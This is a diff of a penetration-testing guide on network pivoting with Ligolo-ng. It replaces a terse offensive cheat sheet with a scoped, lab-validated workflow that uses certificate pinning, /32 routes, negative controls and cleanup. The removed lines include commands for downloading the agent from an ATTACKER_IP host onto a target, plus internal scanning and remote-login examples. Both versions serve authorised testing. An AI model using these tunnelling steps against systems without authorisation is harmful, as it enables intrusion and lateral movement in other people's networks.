@@ -1,200 +1,133 @@
-# Pivoting – Ligolo-ng
+# Ligolo-ng pivoting — verified Linux TCP workflow
 
-## Purpose
+**Lab-validated:** Ligolo-ng 0.9.2, Linux amd64, 2026-09-26. The [verification record](../labs/ligolo/result.json) and [reproducible lab](../labs/ligolo/README.md) show successful routed HTTP, a stopped-tunnel negative control, and cleanup. Commands below use the flags and operations exercised by that fixture; substitute only the documented engagement inputs.
 
-This file provides a structured workflow for using Ligolo-ng to pivot into internal networks using a TUN interface.
+Topology: operator/proxy → agent/pivot → approved internal destination. The agent initiates the TLS connection to the proxy. A TUN interface on the operator carries the selected destination traffic; this does not imply authorization for every agent-reachable network.
 
-Core rules:
-- Ligolo provides full network access (not just port forwarding)
-- Uses a virtual network interface (TUN)
-- Allows native tool usage (nmap, smbclient, etc.)
-- More powerful than SOCKS-based pivoting
+## 1. Prepare the binaries and scope
 
----
+Use the official [0.9.2 release](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.9.2), matching each platform/architecture, and verify its checksum file. The tested Linux amd64 archives have these SHA-256 digests:
 
-## 0. Mental Model
+| Archive | SHA-256 |
+| --- | --- |
+| `ligolo-ng_agent_0.9.2_linux_amd64.tar.gz` | `714534917a4a58812669619667cc57dfad03d34d0de5b0d7c468d76819f84111` |
+| `ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz` | `6c683c403502d366276595197749e620c975908dae7314c21079ec8ebee4e5d0` |
 
-You create a virtual network interface on your attacker machine.
+[Download and local-lab commands](../labs/ligolo/README.md) are provided separately. Transfer only the matching agent binary through an approved channel. Verify its provenance on the receiving host.
 
-Traffic flows like:
+Record the operator listener address, agent, destination IP and port, existing routes, approved test objective and cleanup owner. Use a single destination /32 for the initial TCP validation. Review overlapping VPN/internal ranges before adding routes.
 
-[ATTACKER] ⇄ [TUN INTERFACE] ⇄ [AGENT] ⇄ [INTERNAL NETWORK]
+## 2. Operator Bash: prepare the interface
 
-To your tools:
-→ internal network looks directly connected
+Use a fresh interface name. These commands require administrative network privileges; the automated lab confines them to its proxy container.
 
----
+```bash
+ip route show
+sudo ip tuntap add user "$(id -un)" mode tun rbligolo
+sudo ip link set rbligolo up
+ip link show rbligolo
+```
 
-## 1. Components
+The `user` option permits the named operator to open the interface; the lab runs as container root and uses the same TUN operation without that ownership option. If the interface already exists, inspect it instead of overwriting or deleting another session's interface.
 
-- ligolo-proxy (attacker)
-- ligolo-agent (target)
+## 3. Operator Bash: create a test certificate and start the proxy
 
----
+For the disposable lab or an approved temporary test setup, create a private working directory. The fixture uses this certificate/key method, not disabled TLS verification:
 
-## 2. Start Proxy (ATTACKER)
+```bash
+umask 077
+mkdir -p ligolo-session
+cd ligolo-session || exit 1
+openssl req -x509 -newkey rsa:2048 -nodes \
+  -keyout key.pem -out cert.pem -days 1 -subj '/CN=rb-ligolo-lab'
+printf 'web:\n  enabled: false\n' > ligolo.yaml
+openssl x509 -in cert.pem -noout -fingerprint -sha256
+read -r -p 'Absolute path to verified proxy binary: ' PROXY_BIN
+read -r -p 'Approved operator listen IP: ' LISTEN_IP
+"$PROXY_BIN" -config ./ligolo.yaml -certfile ./cert.pem -keyfile ./key.pem \
+  -laddr "${LISTEN_IP}:11601"
+```
 
-./proxy -selfcert
+Keep this terminal open. Supply an IP reachable from the agent and restrict access appropriately. The explicit configuration disables the optional WebUI and avoids a first-start prompt. For a longer engagement use its approved certificate/key lifecycle; the one-day key above is a lab example.
 
-OR specify port:
+Read the SHA-256 fingerprint from the trusted operator terminal and remove the colon separators for the agent input. Do not obtain the expected fingerprint from an untrusted connection to the server.
 
-./proxy -selfcert -laddr 0.0.0.0:11601
+## 4. Agent Bash: connect with certificate pinning
 
----
+Run where the agent binary has been transferred:
 
-## 3. Transfer Agent
+```bash
+read -r -p 'Approved proxy IP: ' PROXY_IP
+read -r -p 'Trusted proxy SHA-256 fingerprint (hex, no colons): ' FINGERPRINT
+./agent -connect "${PROXY_IP}:11601" -accept-fingerprint "$FINGERPRINT"
+```
 
-python3 -m http.server 8000
+Expected: the proxy reports `Agent joined`. A rejected fingerprint is a trust/configuration problem; do not bypass it with `-ignore-cert`. Keep the agent foreground process available for controlled shutdown.
 
-On target:
+## 5. Proxy console: choose the agent and start the tunnel
 
-wget http://<ATTACKER_IP>:8000/agent.exe
+These are Ligolo console commands, not Bash commands:
 
-OR:
-
-certutil -urlcache -split -f http://<ATTACKER_IP>:8000/agent.exe agent.exe
-
----
-
-## 4. Start Agent (TARGET)
-
-./agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
-
----
-
-## 5. Create TUN Interface (ATTACKER)
-
-sudo ip tuntap add user $(whoami) mode tun ligolo
-
-sudo ip link set ligolo up
-
----
-
-## 6. Start Session (PROXY CONSOLE)
-
-Inside proxy:
-
+```text
 session
+```
 
-Select agent
+Select the intended agent using the menu and Enter, then:
 
----
+```text
+tunnel_start --tun rbligolo
+```
 
-## 7. Start Tunnel
+Expected: `Starting tunnel` for that agent. Match its identity to the scope record. The fixture uses exactly this selection and start sequence.
 
-start
+## 6. Second operator Bash terminal: add the narrow route and verify
 
----
+Use a numeric IPv4 destination reachable from the agent and a known synthetic HTTP proof endpoint for the lab:
 
-## 8. Add Route to Internal Network (CRITICAL)
+```bash
+read -r -p 'Approved internal IPv4 destination: ' DESTINATION_IP
+read -r -p 'Approved HTTP TCP port: ' DESTINATION_PORT
+sudo ip route add "${DESTINATION_IP}/32" dev rbligolo
+ip route get "$DESTINATION_IP"
+curl --noproxy '*' --silent --show-error --fail \
+  --connect-timeout 2 --max-time 4 \
+  "http://${DESTINATION_IP}:${DESTINATION_PORT}/proof.txt"
+```
 
-Example:
+Expected in the supplied lab: `red-brixen-ligolo-proof`. Before tunneling the same operator request must fail, while the agent's request succeeds. If direct operator access already succeeds, that environment cannot establish the tunnel as the exclusive path. A connection alone does not establish a security finding.
 
-sudo ip route add 10.10.0.0/24 dev ligolo
+The route deliberately uses /32. Broader prefixes need a separate scope and route review. A ping is not a substitute for testing the application protocol. HTTPS requires correct hostname/SNI and certificate validation.
 
----
+## 7. Stop, verify the negative control, and clean up
 
-## 9. Verify Connectivity
+In the proxy console:
 
-ping 10.10.0.1
+```text
+tunnel_stop
+```
 
----
+Repeat the operator curl command: it should now fail in the isolated lab, while the agent's direct request remains successful. Then, in the same operator Bash terminal where `DESTINATION_IP` was set:
 
-## 10. Use Native Tools (BIG ADVANTAGE)
+```bash
+sudo ip route del "${DESTINATION_IP}/32" dev rbligolo
+sudo ip link delete rbligolo
+```
 
-nmap -sT -Pn 10.10.0.5
+Stop the foreground agent and proxy processes with Ctrl-C. Remove only the transferred agent and temporary certificate/configuration files created for this test, after preserving required evidence. Confirm the original route state, listener closure and artifact removal. The automated fixture also destroys its dedicated containers and networks.
 
-smbclient -L //10.10.0.5
+## Troubleshooting and coverage boundaries
 
-evil-winrm -i 10.10.0.5 -u user -p password
+| Symptom or feature | Action/status |
+| --- | --- |
+| Agent cannot connect | Check approved listener address, port and firewall; confirm agent-to-proxy direction |
+| Fingerprint rejected | Compare the trusted certificate fingerprint and endpoint; retain TLS verification |
+| Tunnel starts but request times out | Check selected agent, /32 route, agent-to-target reachability and target service |
+| Interface busy or route already exists | Inspect existing sessions/routes; do not overwrite unrelated state |
+| Hostname fails but numeric IP works | DNS path needs separate validation; this record only tests numeric IPv4 |
+| UDP/ICMP | Not validated by this lab; do not infer support from the TCP result |
+| Windows agent/proxy | Requires architecture-specific binaries and a separate lab record |
+| Reverse listeners and double pivots | Planned; use primary references for research, not a verified command claim |
 
----
+Record versions, topology, sanitized commands, timestamps, destination result, negative control and cleanup with the finding. If the path proves an unintended segmentation boundary crossing, describe the intended policy and observed access, recommend scoped network/service controls, and retest from the same source.
 
-## 11. Multiple Networks
-
-Add additional routes:
-
-sudo ip route add 172.16.0.0/16 dev ligolo
-
----
-
-## 12. Remove Route (Cleanup)
-
-sudo ip route del 10.10.0.0/24
-
----
-
-## 13. Background Sessions
-
-You can maintain multiple agents and switch between them
-
----
-
-## 14. Common Use Cases
-
-- Active Directory enumeration
-- internal SMB scanning
-- RDP access
-- web application testing
-- lateral movement
-
----
-
-## 15. Common Failure Points (CRITICAL)
-
-- forgetting to add route
-- wrong subnet
-- TUN interface not up
-- firewall blocking connection
-- using ICMP when blocked
-
----
-
-## 16. If Ping Fails
-
-Try:
-
-nmap -Pn <target>
-
-ICMP often blocked
-
----
-
-## 17. Troubleshooting Checklist
-
-- agent connected?
-- TUN interface up?
-- route added?
-- correct subnet?
-- correct internal IP?
-
----
-
-## 18. Quick Exploit Pattern
-
-1. start proxy
-2. upload agent
-3. connect agent
-4. create TUN interface
-5. start tunnel
-6. add route
-7. scan internal network
-
----
-
-## 19. Mental Model
-
-Agent = foothold  
-TUN = bridge  
-Route = direction  
-Tools = direct access  
-
----
-
-## 20. Golden Rules
-
-- Always add route (most common failure)
-- Use correct subnet (not /32 unless needed)
-- Prefer TCP scans (nmap -sT -Pn)
-- Ligolo = near-native access (use it fully)
-- Keep chisel as fallback
+Primary references: [Ligolo quickstart](https://docs.ligolo.ng/Quickstart/), [advanced pivoting](https://docs.ligolo.ng/sample/double/), and the [pinned CLI implementation](https://github.com/nicocha30/ligolo-ng/blob/v0.9.2/cmd/proxy/app/app.go). Actual verification is limited to the linked lab record.
